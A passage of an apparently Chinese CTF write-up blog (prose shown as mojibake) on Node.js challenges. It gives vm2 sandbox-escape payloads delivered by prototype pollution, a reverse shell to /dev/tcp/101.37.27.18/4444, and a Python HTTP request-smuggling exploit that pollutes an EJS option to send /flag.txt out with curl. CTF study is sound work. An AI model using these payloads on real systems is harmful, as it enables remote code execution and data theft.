<p>è¿™ä¸ªå‡½æ•°ç”¨äºåˆå¹¶ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœå¯¹è±¡ä¸­æœ‰åµŒå¥—çš„å¯¹è±¡ï¼Œå®ƒä¼šé€’å½’åœ°è¿›è¡Œåˆå¹¶ã€‚</p>
</li>
<li><p><strong><code>clone()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ·±æ‹·è´ï¼Œä½¿ç”¨<code>merge()</code>å‡½æ•°å®ç°ã€‚</p>
</li>
</ol>
<p>ä¼ å…¥ä¸€ä¸ªjsonæ•°æ®ï¼Œç»è¿‡json.parseå‡½æ•°è§£æï¼Œå†é€šè¿‡clone()å‡½æ•°å¤åˆ¶åˆ°copybodyä¸­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722090830557.png" alt="image-20240722090830557"></p>
<p>vm2ä¼šæ‰§è¡Œshellcodeå±æ€§é‡Œé¢çš„å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦å°†è¯¥å±æ€§æ±¡æŸ“æˆvm2æ²™ç®±é€ƒé€¸çš„payloadå³å¯æ‰§è¡Œå‘½ä»¤ï¼Œexp</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;shit&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;shellcode&quot;</span><span class="punctuation">:</span><span class="string">&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(&#x27; + function()<span class="punctuation">&#123;</span></span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	try<span class="punctuation">&#123;</span></span><br><span class="line">		Object.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	<span class="punctuation">&#125;</span>catch(e)<span class="punctuation">&#123;</span></span><br><span class="line">		return e.get_process(()=&gt;<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>+&#x27;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(&#x27; + function()<span class="punctuation">&#123;</span></span><br><span class="line">	try<span class="punctuation">&#123;</span></span><br><span class="line">		Buffer.from(new Proxy(<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">			getOwnPropertyDescriptor()<span class="punctuation">&#123;</span></span><br><span class="line">				throw f=&gt;f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span>));</span><br><span class="line">	<span class="punctuation">&#125;</span>catch(e)<span class="punctuation">&#123;</span></span><br><span class="line">		return e(()=&gt;<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>+&#x27;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()<span class="punctuation">&#123;</span></span><br><span class="line">    TypeError<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`prototyp`<span class="punctuation">&#125;</span>e`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span><span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`get_proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span> = f=&gt;f<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`constructo`<span class="punctuation">&#125;</span>r`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`return this.proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`)();</span><br><span class="line">    try<span class="punctuation">&#123;</span></span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = <span class="number">1</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span>catch(e)<span class="punctuation">&#123;</span></span><br><span class="line">        return e<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`get_proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(()=&gt;<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>).mainModule<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`requir`<span class="punctuation">&#125;</span>e`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`child_proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`)<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`exe`<span class="punctuation">&#125;</span>cSync`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(`cat /flag`).toString();</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>)()</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å›æ˜¾ï¼Œåæ–œæ è½¬ä¹‰ï¼Œbashé‡Œé¢å•å¼•å·ä¸è¡Œå°±æ¢åŒå¼•å·</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;shit&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;shellcode&quot;</span><span class="punctuation">:</span><span class="string">&quot;let res = import(&#x27;./app.js&#x27;);res.toString.constructor(\&quot;return this\&quot;)().process.mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/101.37.27.18/4444 0&gt;&amp;1\&quot;&#x27;).toString();&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722092054164.png" alt="image-20240722092054164"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722092115217.png" alt="image-20240722092115217"></p>
<h2 id="è¥¿æ¹–è®ºå‰‘-2022-real-ez-node"><a href="#è¥¿æ¹–è®ºå‰‘-2022-real-ez-node" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node"></a>[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</h2><p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722093816221.png" alt="image-20240722093816221"></p>
<p>app.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);<span class="comment">//è§£æ,ç”¨req.bodyè·å–postå‚æ•°</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  secret : <span class="string">&#x27;secret&#x27;</span>, <span class="comment">// å¯¹session id ç›¸å…³çš„cookie è¿›è¡Œç­¾å</span></span><br><span class="line">  resave : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>, <span class="comment">// æ˜¯å¦ä¿å­˜æœªåˆå§‹åŒ–çš„ä¼šè¯</span></span><br><span class="line">  cookie : &#123;</span><br><span class="line">    maxAge : <span class="number">1000</span> * <span class="number">60</span> * <span class="number">3</span>, <span class="comment">// è®¾ç½® session çš„æœ‰æ•ˆæ—¶é—´ï¼Œå•ä½æ¯«ç§’</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123;    // è®¾ç½®ä½¿ç”¨ ejs æ¨¡æ¿å¼•æ“ </span></span><br><span class="line"><span class="comment">//   fs.readFile(filePath, (err, content) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//       if (err) return callback(new Error(err))</span></span><br><span class="line"><span class="comment">//       let compiled = lodash.template(content)    // ä½¿ç”¨ lodash.template åˆ›å»ºä¸€ä¸ªé¢„ç¼–è¯‘æ¨¡æ¿æ–¹æ³•ä¾›åé¢ä½¿ç”¨</span></span><br><span class="line"><span class="comment">//       let rendered = compiled()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//       return callback(null, rendered)</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, index);</span><br><span class="line"><span class="comment">// app.use(&#x27;/challenge7&#x27;, challenge7);</span></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">message</span> = err.<span class="property">message</span>;</span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">error</span> = req.<span class="property">app</span>.<span class="title function_">get</span>(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">status</span> || <span class="number">500</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br></pre></td></tr></table></figure>

<p>index.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// ä»»ä½• 2xx çŠ¶æ€ç éƒ½è¡¨ç¤ºæˆåŠŸå“åº”ï¼Œä½†è¿™é‡Œåªæ£€æŸ¥ 200ã€‚</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// æ¶ˆè´¹å“åº”æ•°æ®ä»¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1001.2101.3001.7020">åŸå‹é“¾</a>æ±¡æŸ“ï¼Œ<code>__proto__</code>è¢«è¿‡æ»¤ï¼Œä½¿ç”¨<code>constructor.prototype</code></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722094915229.png" alt="image-20240722094915229"></p>
<p>è®¿é—®&#x2F;copyçš„ipè¢«é™åˆ¶ï¼Œé€šè¿‡è®¿é—®&#x2F;curlåˆ©ç”¨HTTPèµ°ç§å‘&#x2F;copyå‘é€POSTè¯·æ±‚ï¼Œç„¶åæ±¡æŸ“åŸå‹é“¾å®ç°ä»£ç æ‰§è¡Œã€‚curlè·¯ç”±åªæœ‰qå‚æ•°å¯æ§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>POSTé“</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 155</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;x;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl 101.37.27.18:4444/`cat /flag.txt`&#x27;);var x&quot;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">data</span>):</span><br><span class="line">    tmp = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="number">0x0100</span> + <span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://node4.anna.nssctf.cn:28807/curl?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722100733444.png" alt="image-20240722100733444"></p>
<h2 id="GFCTF-2021-ez-calc"><a href="#GFCTF-2021-ez-calc" class="headerlink" title="[GFCTF 2021]ez_calc"></a>[GFCTF 2021]ez_calc</h2><p>é¢˜ç›®æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.åˆ«æƒ³å¤ªå¤æ‚ï¼Œè¯•ç€ä¼ ä¼ å…¶ä»–æ•°æ®ç±»å‹</span><br><span class="line">2.å­—ç¬¦ä¸²çš„lengthå’Œæ•°ç»„çš„lengthæ˜¯ä¸ä¸€æ ·çš„ã€‚ä½ èƒ½å°†è‡ªå·±çš„payloadé€ƒé€¸å‡ºæ¥å—ã€‚æ³¨ï¼šæœ¬é¢˜æ‰€æœ‰æç¤ºéƒ½åªé’ˆå¯¹ç™»é™†åçš„æ“ä½œã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722101425663.png" alt="image-20240722101425663"></p>
